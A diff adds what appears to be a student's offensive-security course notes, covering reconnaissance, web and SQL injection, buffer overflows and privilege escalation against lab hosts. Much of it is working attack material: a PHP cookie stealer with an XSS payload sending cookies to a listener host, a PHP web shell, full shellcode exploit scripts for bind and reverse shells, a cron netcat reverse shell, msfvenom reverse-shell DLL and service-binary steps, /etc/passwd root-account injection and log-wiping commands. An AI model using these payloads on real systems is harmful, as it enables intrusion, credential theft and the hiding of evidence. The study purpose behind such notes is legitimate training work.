@@ -1,0 +1,941 @@
+XFREERDP Syntax: xfreerdp /cert-ignore /v:10.50.x.x /u:student /p:password /size:1920x1000 +clipboard
+
+
+
+
+Blue - anything that you own
+Gray - anything that is not yours or the enemy’s
+Red - anything that belongs to enemies
+
+
+  
+
+
+
+
+
+
+
+View raw html in firefox:
+1. Right click -> inspect 
+2. CTRL + U
+
+
+View raw html via python script:
+ page = requests.get('http://quotes.toscrape.com')
+ print(page.content)
+
+
+
+
+Ping sweep command:
+for i in {1..254}; do (ping -c 1 192.168.65.$i | grep "bytes from" &); done
+
+
+
+
+Resource for quick nmap command construction:
+https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/
+
+
+nmap -v -sT -Pn -T4 192.168.65.20 -p 22,80 //Fast scan of ports 22 and 80, ignoring discovery (with TCP Connect (-sT)); add -sV to get versions of the open protocols
+
+
+nmap -v -sT -Pn -T4 -script http-robots.txt 192.168.65.20 -p 80
+
+
+Nc -nvz 192.168.65.20 22 
+
+
+Nmap –script smb-os-discovery 192.168.150.245 -p 445
+
+
+Web Exploitation
+
+
+Http Methods:
+* GET - Get something from the server
+* HEAD - Banner grabbing (make sure it’s an HTTP server)
+* POST - Uploading things
+
+
+Http Response Codes:
+* 10X == Informational
+* 2XX == Success
+* 30X == Redirection
+* 4XX = Client Error
+* 5XX == Server Error
+https://tools.ietf.org/html/rfc2616
+
+
+Looking at HTTP packet header: (Firefox)
+* Right click -> Inspect
+* Network tab -> select Method (view Headers on right side)
+
+
+Http Fields:
+* User-Agent
+* Referrer
+* Cookie
+* Date
+* Server
+* Set-Cookie
+
+
+WGET
+Recursive download, recover from broken transfers, SSL/TLS support:
+
+
+* wget -r -l2 -P /tmp ftp://ftpserver/
+* Wget         --save-cookies         cookies.txt         --keep-session-cookies         --post-data 'user=1&password=2' http://website
+* wget --load-cookies cookies.txt -p http://....com/interesting/article.php
+
+
+CURL
+* Not recursive, can use pipes, Upload ability
+* Supports more protocols vs WGET such as SCP, POP3
+
+
+* curl -o stuff.html http://website/stuff.html
+* curl 'www..com' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
+Using curl to change user-agent:
+* curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/81.0" https://example.com/"
+Javascript - Client is running the code NOT the server
+
+
+Robots.txt:
+A robots.txt file tells search engine crawlers which URLs the crawler can access on your site. This is used mainly to avoid overloading your site with requests; it is not a mechanism for keeping a web page out of Google. 
+
+
+Nikto:
+* Sudo apt-get install nikto
+* nikto -host http://10.50.31.120
+Nmap:
+* nmap -v -sT -Pn -T4 --script http-robots.txt.nse 10.50.31.120
+
+
+CROSS-SITE SCRIPTING (XSS)OVERVIEW
+* Insertion of arbitrary code into a web page that executes in the browser of visitors
+* Unsanitized GET, POST, and PUT methods allow JS to operate on websites
+* It is often found in forums that allow HTML
+REFLECTED XSS
+* The most common form of XSS
+* Transient, occurs in error messages or search result
+* Delivered through intermediate media, such as a link in an email.
+* Characters that are normally illegal in URLs can be base64 encoded
+* Below is what you see, server will decode name=
+* http://example.com/page.php?name=dXNlcjEyMw%3D%3D
+
+
+STORED XSS
+* Resides on vulnerable site (iframe)
+* Only requires user to visit page
+
+
+USEFUL JAVASCRIPT COMPONENTS
+Proof of concept; simple alert :
+* <script>alert('XSS')</script> (Test for XSS) (Copy this letter by letter because docs messes up formatting)
+   * Capturing Cookies → document.cookie
+   * Capturing Keystrokes → bind "keydown" and "keyup"
+   * Capturing Sensitive Data → document.body.innerHTML
+
+
+SERVER-SIDE INJECTION
+* Directory Traversal/Path Traversal
+* Ability to read/execute outside web server’s directory
+* uses ../../ (absolute paths) in manipulating variables
+* view_image.php?file=../../etc/passwd
+
+
+MALICIOUS FILE UPLOAD
+* Site allows unsanitized file uploads.
+* Server doesn’t validate extension or size
+* Allows for code execution → shell
+* Once uploaded, find your file, call your file
+
+
+COMMAND INJECTION
+* Application on the server is vulnerable by allowing execution of arbitrary data.
+* Again, user input not validated
+* SOHO router with a web page to do ping
+* system("ping -c 1 ".$_GET["ip"]);
+* ; cat /etc/passwd
+
+
+Cookie Stealer:
+<?php
+$cookie = $_GET[‘bakery’];
+$steal = fopen(“/var/www/html/uploads/cookiesfiles.txt”, “a+”);
+fwrite ($steal, $cookie . ”\n”);
+fclose($steal);
+?>
+
+
+<script>document.location="http://10.100.28.40/uploads/cookiestealer_pierce.php?bakery="+ document.cookie;</script> 
+REMEMBER TO REPLACE THE QUOTES (MAY NOT NEED IP DEPENDING ON THE LOCATION)
+
+
+Python3 -m http.server
+For python http listener:
+<script>document.location=”http://10.50.20.82:8000/”+ document.cookie;</script>
+
+
+Webshell script: (Get on the server to allow for command injection)
+ <HTML><BODY>
+ <FORM METHOD="GET" NAME="myform" ACTION="">
+ <INPUT TYPE="text" NAME="cmd">
+ <INPUT TYPE="submit" VALUE="Send">
+ </FORM>
+ <pre>
+ <?php
+ if($_GET['cmd'])
+ {
+         system($_GET['cmd']);
+ }
+ ?>
+ </pre>
+ </BODY></HTML>
+
+
+Establishing ssh persistence on the target machine
+* Ssh-keygen -t rsa -b 4096
+* Passphrase blank
+* Cat /home/student/.ssh/id_rsa.pub (not private key) Copy entire key
+* Place key in home directory .ssh folder of the user (www-data would be in /var/www) if unsure, find out in /etc/passwd
+* If .ssh does not exist in the home directory -> mkdir /var/www/.ssh
+* Echo “{publickey}” >> /var/www/.ssh/authorized_keys
+* Ssh -i .ssh/id_rsa www-data@10.50.31.120 (To use proxychains from your lin-ops you will need to copy keys over from the gray or whatever box you are trying to pivot from)
+
+
+SQL Database
+Database -> Tables -> Columns
+Commands:
+* Show databases
+* Show tables from session;
+* Select * from session.Tires (Select everything from the session table -> the dot . steps into the session table and selects Tires)
+* Select name from session.Tires; (Select just the name column from the Tires table in the session database)
+* Select name,pass from session.user WHERE name=’admin”; 
+* SELECT column,another_column FROM mytable WHERE Title="Example" ORDER BY column ASC/DESC LIMIT num_limit OFFSET num_offset;
+* tom'OR 1='1 (Test)
+
+
+SQL INJECTION - CONSIDERATIONS
+* Require Valid SQL Queries
+* Fully patched systems can be vulnerable due to misconfiguration
+* Input Field Sanitization
+* String vs Integer Values
+* Is information_schema Database available?
+* GET Request versus POST Request HTTP methods
+
+
+
+
+
+
+Golden statement (will not change for mySQL):
+* Table_schema
+* Table_name
+* From information_schema.tables
+
+
+
+
+Syntax from lecture:
+GET
+* UNION SELECT table_schema, table_name,3,4,5,6,7,8 from information_schema.tables;
+
+
+        POST
+* Audi' UNION select table_name,2,table_schema,4,5 from information_schema.tables;#
+
+
+* Audi' UNION select table_schema,2,table_name,column_name,5 from information_schema.columns WHERE table_schema="session";#
+
+
+* login.php?username=’&password=test' OR 1='1;
+* http://10.50.33.41/uniondemo.php?Selection=2%20UNION%20Select%201,3,2;
+
+
+* http://10.50.33.41/uniondemo.php?Selection=2%20UNION%20Select%20table_schema,table_name,3%20from%20information_schema.tables;
+* From dryrun: Find vulnerable query table and how many fields it takes. 
+* http://localhost:3004/pick.php?product=7%20UNION%20Select%20table_name,table_schema,2%20from%20information_schema.tables; (This will make sense, just read it…)
+
+
+
+
+
+
+
+
+Syntax from challenges:
+* user','pass','email','1'); #
+* M'  UNION SELECT table_name,table_schema from information_schema.tables; #
+* M'  UNION SELECT username,permission from sqlinjection.members; #
+* http://localhost:11709/cases/productsCategory.php?category=13 - Getting category flag
+* M'UNION SELECT @@version,1 ;#
+
+
+
+
+Default mySQL Databases:
+* Mysql
+* Performance_schema
+* Information_schema
+
+
+
+
+
+
+
+
+sqlinjection        categories
+sqlinjection        members
+sqlinjection        orderlines
+sqlinjection        orders
+sqlinjection        payments
+sqlinjection        permissions
+sqlinjection        products
+sqlinjection        share4
+
+
+
+
+categories        id
+categories        name
+categories        description
+members        id
+members        username
+members        password
+members        first_name
+members        last_name
+members        email
+members        permission
+orderlines        id
+orderlines        quantity
+orderlines        product
+orderlines        order
+orders        id
+orders        date
+orders        member
+payments        id
+payments        creditcard_number
+payments        date
+payments        order
+permissions        id
+permissions        level
+permissions        name
+permissions        description
+products        id
+products        name
+products        description
+products        price
+products        qty_left
+products        category
+share4        id
+share4        comment
+share4        mime
+share4        data
+
+
+Keys to the kingdom:
+
+
+SkFwVTVuWXZoWTBXVjhTa1dZbjAK (Base64)
+{ 4nGfU        87s2V }
+SQLi_B4D_A55
+VC-096-ULTIMATE        flag: { gkJdHbNzakI2TqrFaSYG }
+
+
+
+
+Reverse Engineering
+* %rax - the first return register
+
+
+* %rbp - the base pointer that keeps track of the base of the stack
+
+
+* %rsp - the stack pointer that points to the top of the stack
+
+
+
+
+Heap - Dynamic memory
+Stack - Continuous block of memory (put stuff in, pop stuff out)
+
+
+General Register - A multipurpose register that can be used by either programmer or user to store data or a memory location address
+
+
+Control Register - A processor register that changes or controls the behavior of a CPU
+
+
+Flags Register - Contains the current state of the processor
+
+
+RIP - 64-bit
+EIP - lower 32-bits
+IP - lower 16-bits (Instruction pointer; holds address for next instruction to be executed)
+
+
+X86_64 Assembly - Common Instruction Pointers:
+MOV - move source to destination
+
+
+PUSH - push source onto stack
+
+
+POP - Pop top of stack to destination
+
+
+INC - Increment source by 1
+
+
+DEC - Decrement source by 1
+
+
+ADD - Add source to destination
+
+
+SUB - Subtract source from destination
+
+
+CMP - Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same. (Subtract 2 things to see if they equal 0. If zero, then they are the same)
+
+
+JMP - Jump to specified location
+
+
+JLE - Jump if less than or equal -Value on left is less than value on the right
+
+
+JE - Jump if equal
+
+
+Static Analysis - Strings and file commands
+
+
+Dynamic Analysis - Debuggers and stuff
+
+
+
+
+Static steps:
+1. Run file on the file to see what kind of file it is
+2. Run strings on the file to potentially discover important keywords to search for
+
+
+Dynamic steps:
+1. Run the file and observe
+IDA Steps:
+1. View -> Open subviews -> Strings
+2. Search for keyword and double click it
+3. Follow functions and figure out how to get desired output
+4. Validate findings
+
+
+Ghidra Steps:
+1. New project
+2. Import file
+3. Double click file and allow analyzing
+4. Search -> For strings (find keywords)
+5. Click on desired keyword and follow functions
+6. Validate findings
+        
+Patching:
+IDA Steps: 
+1. Find instruction to change
+2. Edit -> Patch Program -> Assemble
+3. Change the instruction to desired value
+4. Edit -> Patch Program -> Apply assemble
+        Ghidra Steps:
+1. Use find string then locate instruction to patch (On left side, not in pseudo code)
+2. Right click instruction -> Patch
+3. File -> Export program
+
+
+For converting encryption to 32 bit signed (python): int('{:032b}'.format(myNum)[-32:],2)
+
+
+Exploit Development:
+https://captmeelo.com/exploitdev/osceprep/2018/06/27/vulnserver-trun.html
+
+
+BUFFER OVERFLOW COMMON TERMS
+Heap - memory that can be allocated and deallocated
+
+
+Stack - a contiguous section of memory used for passing arguments
+
+
+Registers - Storage elements as close as possible to the central processing unit (CPU)
+
+
+Instruction Pointer (IP) - AKA Program Counter (PC) contains the address of next instruction to be executed
+
+
+Stack Pointer (SP) - Contains the address of the next available space on the stack
+
+
+Base Pointer (BP) - The base of the stack
+
+
+Function - Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
+
+
+Shellcode - The code that is executed once an exploit successfully takes advantage of a vulnerability
+
+
+Buffer Overflow Defenses:
+* Non executable (NX) stack
+* Address Space Layout Randomization (ASLR)
+* Data Execution Prevention (DEP)
+* Stack Canaries
+* Position Independent Executable (PIE)
+
+
+GDB USES
+INSTALL of Peda Plugin
+
+
+* git clone https://github.com/longld/peda.git ~/peda
+* echo "source ~/peda/peda.py" >> ~/.gdbinit
+
+
+Common Commands
+
+
+* disass <FUNCTION>   -   Disassemble portion of the program
+* info <...>  -   Supply info for specific stack areas
+* x/256c $<REGISTER>  -   Read characters from specific register
+* break <address>  -   Establish a break point
+
+
+
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+Buffer Overflow Scripts:
+-------------------------------------------------------------------------------------------------------------------------------------
+Linux Vulnerable Executable
+#!/usr/bin/python
+   
+# Your buffer is below (Find the offset from wiremask link above)
+   
+buffer = "A" * 62
+   
+#Overwriting the EIP register (Replace this with mem address pointing to instruction)
+   
+eip = "B" * 4
+  
+#Extra nop padding 
+  
+nop = "\x90" * 10
+  
+#Shell code
+buf =  b""
+buf += b"\xdb\xcc\xd9\x74\x24\xf4\xba\xac\xdb\x43\x85\x5e\x2b"
+buf += b"\xc9\xb1\x0b\x83\xee\xfc\x31\x56\x15\x03\x56\x15\x4e"
+buf += b"\x2e\x29\x8e\xd6\x48\xfc\xf6\x8e\x47\x62\x7e\xa9\xf0"
+buf += b"\x4b\xf3\x5d\x01\xfc\xdc\xff\x68\x92\xab\x1c\x38\x82"
+buf += b"\xab\xe2\xbd\x52\xc3\x8a\xd2\x33\x46\x23\x2d\xe3\xcb"
+buf += b"\x3a\xcc\xc6\x6c"
+  
+print(buffer+eip+nop+buf)
+
+
+-------------------------------------------------------------------------------------------------------------------------------------
+TCP Bind Shellcode for Windows (Opens port 6969 on target)
+
+
+#!/usr/bin/python
+import socket
+import os
+import sys
+host = "localhost"
+port = 11731
+shellcode = ("\xbf\xbb\x8f\xc2\xcf\xda\xd3\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
+"\x53\x83\xe8\xfc\x31\x78\x0e\x03\xc3\x81\x20\x3a\xcf\x76\x26"
+"\xc5\x2f\x87\x47\x4f\xca\xb6\x47\x2b\x9f\xe9\x77\x3f\xcd\x05"
+"\xf3\x6d\xe5\x9e\x71\xba\x0a\x16\x3f\x9c\x25\xa7\x6c\xdc\x24"
+"\x2b\x6f\x31\x86\x12\xa0\x44\xc7\x53\xdd\xa5\x95\x0c\xa9\x18"
+"\x09\x38\xe7\xa0\xa2\x72\xe9\xa0\x57\xc2\x08\x80\xc6\x58\x53"
+"\x02\xe9\x8d\xef\x0b\xf1\xd2\xca\xc2\x8a\x21\xa0\xd4\x5a\x78"
+"\x49\x7a\xa3\xb4\xb8\x82\xe4\x73\x23\xf1\x1c\x80\xde\x02\xdb"
+"\xfa\x04\x86\xff\x5d\xce\x30\xdb\x5c\x03\xa6\xa8\x53\xe8\xac"
+"\xf6\x77\xef\x61\x8d\x8c\x64\x84\x41\x05\x3e\xa3\x45\x4d\xe4"
+"\xca\xdc\x2b\x4b\xf2\x3e\x94\x34\x56\x35\x39\x20\xeb\x14\x56"
+"\x85\xc6\xa6\xa6\x81\x51\xd5\x94\x0e\xca\x71\x95\xc7\xd4\x86"
+"\xda\xfd\xa1\x18\x25\xfe\xd1\x31\xe2\xaa\x81\x29\xc3\xd2\x49"
+"\xa9\xec\x06\xe7\xa1\x4b\xf9\x1a\x4c\x2b\xa9\x9a\xfe\xc4\xa3"
+"\x14\x21\xf4\xcb\xfe\x4a\x9d\x31\x01\x6f\x67\xbf\xe7\xe5\x87"
+"\xe9\xb0\x91\x65\xce\x08\x06\x95\x24\x21\xa0\xde\x2e\xf6\xcf"
+"\xde\x64\x50\x47\x55\x6b\x64\x76\x6a\xa6\xcc\xef\xfd\x3c\x9d"
+"\x42\x9f\x41\xb4\x34\x3c\xd3\x53\xc4\x4b\xc8\xcb\x93\x1c\x3e"
+"\x02\x71\xb1\x19\xbc\x67\x48\xff\x87\x23\x97\x3c\x09\xaa\x5a"
+"\x78\x2d\xbc\xa2\x81\x69\xe8\x7a\xd4\x27\x46\x3d\x8e\x89\x30"
+"\x97\x7d\x40\xd4\x6e\x4e\x53\xa2\x6e\x9b\x25\x4a\xde\x72\x70"
+"\x75\xef\x12\x74\x0e\x0d\x83\x7b\xc5\x95\xa3\x99\xcf\xe3\x4b"
+"\x04\x9a\x49\x16\xb7\x71\x8d\x2f\x34\x73\x6e\xd4\x24\xf6\x6b"
+"\x90\xe2\xeb\x01\x89\x86\x0b\xb5\xaa\x82")
+buffer = "A"*2002
+buffer += "\xA0\x12\x50\x62"
+buffer += "\x90"*16
+buffer += shellcode
+buffer += "C"*(5000-len(buffer))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+print "[+] Sending exploit..."
+s.send("TRUN /.:/ " + buffer)
+print s.recv(1024)
+s.close()
+
+
+-------------------------------------------------------------------------------------------------------------------------------------
+Reverse TCP Shellcode for Windows (Calls back to Linops floating IP on port 4545) payload/windows/shell_reverse_tcp
+
+
+#!/usr/bin/python
+import socket
+import os
+import sys
+host = "localhost"
+port = 11742
+shellcode=("\xba\xc1\x4d\xb0\xab\xdb\xd6\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\x2a\xb1\x52\x5e\x50\xa2\x11\xa1\xa8\x33\x76\x2b\x4d\x02\xb6\x4f\x06\x35\x06\x1b\x4a\xba\xed\x49\x7e\x49\x83\x45\x71\xfa\x2e\xb0\xbc\xfb\x03\x80\xdf\x7f\x5e\xd5\x3f\x41\x91\x28\x3e\x86\xcc\xc1\x12\x5f\x9a\x74\x82\xd4\xd6\x44\x29\xa6\xf7\xcc\xce\x7f\xf9\xfd\x41\x0b\xa0\xdd\x60\xd8\xd8\x57\x7a\x3d\xe4\x2e\xf1\xf5\x92\xb0\xd3\xc7\x5b\x1e\x1a\xe8\xa9\x5e\x5b\xcf\x51\x15\x95\x33\xef\x2e\x62\x49\x2b\xba\x70\xe9\xb8\x1c\x5c\x0b\x6c\xfa\x17\x07\xd9\x88\x7f\x04\xdc\x5d\xf4\x30\x55\x60\xda\xb0\x2d\x47\xfe\x99\xf6\xe6\xa7\x47\x58\x16\xb7\x27\x05\xb2\xbc\xca\x52\xcf\x9f\x82\x97\xe2\x1f\x53\xb0\x75\x6c\x61\x1f\x2e\xfa\xc9\xe8\xe8\xfd\x2e\xc3\x4d\x91\xd0\xec\xad\xb8\x16\xb8\xfd\xd2\xbf\xc1\x95\x22\x3f\x14\x39\x72\xef\xc7\xfa\x22\x4f\xb8\x92\x28\x40\xe7\x83\x53\x8a\x80\x2e\xae\x5d\xa5\x9c\xa4\xcf\xd1\xe2\xc4\xfe\xe0\x6a\x22\x6a\xf3\x3a\xfd\x03\x6a\x67\x75\xb5\x73\xbd\xf0\xf5\xf8\x32\x05\xbb\x08\x3e\x15\x2c\xf9\x75\x47\xfb\x06\xa0\xef\x67\x94\x2f\xef\xee\x85\xe7\xb8\xa7\x78\xfe\x2c\x5a\x22\xa8\x52\xa7\xb2\x93\xd6\x7c\x07\x1d\xd7\xf1\x33\x39\xc7\xcf\xbc\x05\xb3\x9f\xea\xd3\x6d\x66\x45\x92\xc7\x30\x3a\x7c\x8f\xc5\x70\xbf\xc9\xc9\x5c\x49\x35\x7b\x09\x0c\x4a\xb4\xdd\x98\x33\xa8\x7d\x66\xee\x68\x8d\x2d\xb2\xd9\x06\xe8\x27\x58\x4b\x0b\x92\x9f\x72\x88\x16\x60\x81\x90\x53\x65\xcd\x16\x88\x17\x5e\xf3\xae\x84\x5f\xd6")
+buffer = "A"*2002
+buffer += "\xA0\x12\x50\x62"
+buffer += "\x90"*16
+buffer += shellcode
+buffer += "C"*(5000-len(buffer))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+print "[+] Sending exploit..."
+s.send("TRUN /.:/ " + buffer)
+print s.recv(1024)
+s.close()
+
+
+
+
+
+
+
+
+
+
+To get shellcode hex:
+* Run msfconsole and find desired payload
+* generate -b "\x00\x20\x0a\x0d" -f python - generating payload in hex (in python format), ignoring bad characters 
+   * 0d - carriage return
+   * 0a - line feed
+   * 00 - null
+* Alternatively, msfvenom -p linux/x86/exec CMD=whoami -b '\x00\xff\x0A\x0D' -f python (don’t have to go into the msfconsole)
+
+
+GDB/Peda commands:
+* gcc -ggdb -z execstack -fno-stack-protector -m32 binary.c -o function
+
+
+
+
+* run <<<$(python buffo.py) - three <’s because the program prompts for user input AFTER program is run
+* Info proc map - Map out addresses in memory (use to look for a set of instructions to use to point to something else) look from start of stack to end of stack
+* Jmpcall esp 0xf7de1000 - sometimes works but most of the the time doesn’t
+* env - gdb function - GDB without PEDA (This is for when method above does not work)
+* Use info proc map to find the addresses and run find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4 (for jump call)
+* Collect some of the addresses and keep note. For example:
+   * 0xf7f64aff
+   * 0xf7f64d6f
+   * 0xf7f64f97
+   * 0xf7f650cf
+   * 0xf7f65343
+   * 0xf7f65497
+   * 0xf7f655cf
+   * 0xf7f65777
+   * 0xf7f659ef
+   * 0xf7f662eb
+   * 0xf7f6649b
+   * 0xf7f66533
+   * 0xf7f66633
+   * 0xf7f66b3b
+   * 0xf7f66b8b
+   * 0xf7f66cdb
+   * 0xf7f67033
+   * 0xf7f67203
+   * 0xf7f67293
+   * 0xf7f676db
+* Convert to big endian:
+   * 0xf7f64aff -> 0xff4af6f7
+   * 0xf7f64d6f -> 0x6f4df6f7
+   * 0xf7f64f97 -> 0x974ff6f7
+   * 0xf7f65777 -> 0x7757f6f7
+* Try adding first address into the eip variable of your python buffer overflow script (saying next instruction is found at this memory address - Jump to the ESP)
+* Format for the hex in python script is “\xef\x59\xf6\xf7”
+* (Env - sudo) ./function <<<$(python buffo.py) - Run the python script with the binary
+
+
+user1@linux$ cat users
+Permission denied.
+
+
+user1@linux$ env - sudo ./func <<< $(python /tmp/exploit.py)
+You've read this protected file.
+
+
+Windows:
+* Use socket python script to listen for connection to windows machine
+* Send in random pattern and find offset
+* Use mona to find instructions pointing to ESP (jump call)
+!mona modules
+!mona jmp -r esp -m "essfunc.dll"
+* Add jump call address to the script
+
+
+Post Exploitation:
+Control Socket format:
+~/.ssh/config
+HostName machine1.example.org
+ControlPath ~/.ssh/controlmasters/%r@%h:%p
+ControlMaster auto
+ControlPersist 10m
+
+
+Command:  ssh -o ControlPath=~/.ssh/sockets/student@10.50.35.252:22 a
+
+
+Local Host Enumeration:
+        Windows:
+                GUI: Search services, task scheduler, file explorer,  etc.
+* Net user - Find out what users are on the box
+* Tasklist /v - Enumerate processes (Useful for finding antivirus)
+* Tasklist /svc - Enumerate services (Useful for finding antivirus)
+* Ipconfig /all - Enumerate network connection
+* Netstat - Show connections
+* Net share - view shares
+        Linux:
+* Whoami - See if you are the user you are supposed to be
+* Hostname - See hostname of the machine
+* Cat /etc/passwd - Find out what users are on the box
+* Ps -elfH (Hierarchy) - Enumerate processes (Useful for finding antivirus)
+* Chkconfig - Enumerate services
+* Ifconfig -a / ip a - Enumerate network connection
+* Arp -a / ip neigh - View possible previous connections
+* SS -nltp - New netstat command
+* Date - Print time
+* Uname -a - Kernel version info
+* Last - Who was last logged in
+* Find /* -type d -iname “.*” - Find hidden directories
+Important Linux directories:
+* /etc (Look for antivirus)
+* /etc/hosts
+* /etc/rsyslog.conf
+* /tmp
+* /home
+* /root
+* /var/spool/crontab
+* /etc/cron*
+Import Windows directories:
+* C:\
+* C:\Users
+* C:\Users\Public
+* C:\Program Files
+* C:\Windows\System32
+
+
+Privilege Escalation - Linux:
+https://gtfobins.github.io/
+
+
+Ways to configure init type:
+ls -latr /proc/1/exe
+stat /sbin/init
+man init
+init --version
+ps 1
+
+
+AUDITING SYSTEMV
+ausearch → pulls from audit.log
+ausearch -p 22
+ausearch -m USER_LOGIN -sv no
+ausearch -ua edwards -ts yesterday -te now -i
+
+
+LOGS FOR COVERING TRACKS
+Logs typically housed in /var/log, some useful logs:
+
+
+lastlog --- each users successful login time
+btmp --- tracks bad login attempts
+secure --- Syslog
+sulog --- use of su command
+utmp --- users currently on (w)
+wtmp --- permanent record on user on/off
+auth.log/secure --- tracks usage of authorization
+
+
+WORKING WITH LOGS
+* file /var/log/wtmp
+* find /var/log -type f -mmin -10 2> /dev/null
+* journalctl -f -u ssh
+* journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
+
+
+CLEANING THE LOGS:
+Basic:
+Just get rid of it:
+* rm -rf (/path/file)
+Blank it:
+* cat /dev/null > (/path/file)
+* echo > /var/log/btmp
+Precision:
+        Always work off a backup
+* Egrep -v ‘192.168.0.1’ auth.log > auth.log - Removing lines with a specific ip in them
+RSYSLOG
+* Newer Rsyslog call /etc/rsyslog.d/* for settings/rules
+* Older uses /etc/rsyslog.conf
+
+
+To find out:
+* grep "IncludeConfig" /etc/rsyslog.conf
+
+
+Find files based on permissions:
+* find /* -type f -perm /2000 -ls 2>/dev/null - SGID
+* find /* -type f -perm /4000 -ls 2>/dev/null - SUID
+* find /* -type f -perm /6000 -ls 2>/dev/null - SGID + SUID
+* sudo find . -exec /bin/bash \; -quit
+
+Modifying binaries you have sudo access to:
+   * export PATH=.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin (This adds “.” to the beginning of the environmental path so when you run a command it looks in your current directory first)
+   * Make a file called “ls”, for example, that contains something like: #!/bin/bash and cat /etc/shadow
+   * Chmod +x “filename”
+   * Given you have sudo access to ls, you can now do sudo ./ls from the directory that your fake ls script is located (it will print /etc/shadow) (Make sure you have the “.” at the beginning of the $PATH variable AND you chmod your script)
+Crontab nc reverse shell (run every minute):
+- * * * * * nc 192.168.28.135 33403 -e /bin/bash 
+
+
+Creating root user manually (if given ability to write to /etc/passwd):
+   * openssl passwd -1 -salt user3 pass123 (generate hash password for user: user3)
+   * /var/tmp/testbed/unknown /etc/passwd 'user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root/root:/bin/bash' (whatever method for writing to /etc/passwd)
+
+
+Privilege Escalation - Windows:
+Security Descriptors:
+   * DACL - Discretionary Access Control List
+   * SACL - System Access Control List
+   * ACE - Access Control Entries
+Persistence Mechanisms:
+   * Registry key (HKLM\Software\Microsoft\Windows\CurrentVersion\Run)
+   * Task Scheduler
+   * Services
+
+
+USER ACCOUNT CONTROL (UAC)
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+   * Always Notify
+   * Notify me only when programs try to make changes to my computer
+   * Notify me only when programs try to make changes to my computer (do not dim my desktop)
+   * Never notify
+
+
+Privilege Escalation:
+   * (Get-Command calc.exe).Path
+   * Notepad C:\Windows\System32\calc.exe
+   * CTRL+f find “asInvoker” to modify it
+
+
+SchTasks:
+   * schtasks /query /fo LIST /v | Select-String -pattern "Task To Run" | Select-String -pattern "COM handler" -NotMatch
+   * Admin or Privileged accounts can see more scheduled tasks than a regular user
+
+
+DLL Hijacking:
+   * Find vulnerable exe
+   * If no sysinternals on machine, scp exe back to your machine with sysinternals on it
+   * Run procmon and make filters : process name = .exe name, result = NOT (looking for dll NOT found), path = .dll
+   * Run the exe and procmon should populate
+   * Given that the exe was being run as “user” on the machine that it was found on, you want to target a procmon entry that is from that user home directory
+   * sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-i686-dev mingw-w64-tools mingw-w64-x86-64-dev -y (used for making c script)
+   * Create a file in linux (example: file.c)
+ #include <windows.h>
+ int execCommand()
+ {
+     WinExec("cmd /C whoami > C:\\Users\\Public\\Documents\\Bad_Guy.txt", 1);
+     return 0;
+ }
+
+
+ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID LpvReserved)
+ {
+     execCommand();
+     return 0;
+ }
+   * Make sure the output path is something you can actually write to (confirm on the box)
+   * i686-w64-mingw32-g++ -c dllhijacking.c -o DLLHIJACK.o (compile the .c script to a .o)
+   * i686-w64-mingw32-g++ -shared -o DLLHIJACK.dll DLLHIJACK.o -Wl,--out-implib,DLLHIJACK.a (create .dll from the .o file)
+   * msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f dll -e x86/shikata_ga_nai -i 10 > SSPICLI.dll (Alternative way to generate a dll to spawn a shell)
+   * Copy the .dll back to the target machine and put it in the same directory as the .exe
+   * scp hijackmeplz.dll student@192.168.65.10:C:\\Users\\student\\Desktop
+   * Run the .exe and it should find your .dll, given that it’s in the same directory AND it’s named the same as one of the NOT FOUND dll’s in procmon
+Note: You can map a share drive on the rdp machine in the settings of the RDP GUI before you connect
+
+
+Finding and Exploiting Services:
+   * reg query HKLM\System\CurrentControlSet\Services
+   * Better method for single box - GUI (services.msc)
+   * Find service being run persistently and preferably by system
+   * Go to the location of the service/program being run persistently and see if you can manipulate it
+   * msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe  -e x86/shikata_ga_nai -i 10 > 7z.exe (Generate reverse shell exe to put in place of the service trying to run persistently)
+   * Replace old exe extension with .bak/.back (backup) and put your new exe in place of the old one (naming it the same 7z.exe, for example)
+   * Wait for the service to run or trigger if you have to (if it’s called on boot). Your custom exe should be called instead
+
+
+AUDIT LOGGING
+   * Shows all audit category setting
+auditpol /get /category:*
+
+
+   * What does the below command show?
+auditpol /get /category:* | findstr /i "success failure"
+
+
+MICROSOFT EVENT IDS (SOME IMPORTANT ONES)
+   * 4624/4625 successful/failed login
+   * 4720 account created
+   * 4672 administrator equivalent user logs on
+   * 7045 Service creation
+   * PowerShell - get-eventlog -LogName Security | findstr "4624"
+   * GUI - Event Viewer
+
+
+DryRun Notes:
+   * If ports are in use run netstat -plnt | grep <port> 
+   * Look for the program using the ports
+   * Sudo killall <program>
+   * http://localhost:11752/pick.php?product=7 OR 1=1 (Used to test for vulnerability)
+   * http://localhost:11752/pick.php?product=7 UNION select table_schema,table_name,3 from information_schema.tables; # (When you have a page printing a table, like from the demo. Test to see which page is vulnerable and how many fields it wants. You can then add the golden statement and find database names and such)
+   * Nmap -T4 -Pn –min-rate 3049550434 <IP> -p80,8888,8080,443,22,2222,4444 (Super fast scan, scanning the ports list)
+   * Nikto -h <ip> (DONT RUN THROUGH PROXYCHAINS, USE TUNNEL)
+   * Nmap –script=http-enum <IP> -p80
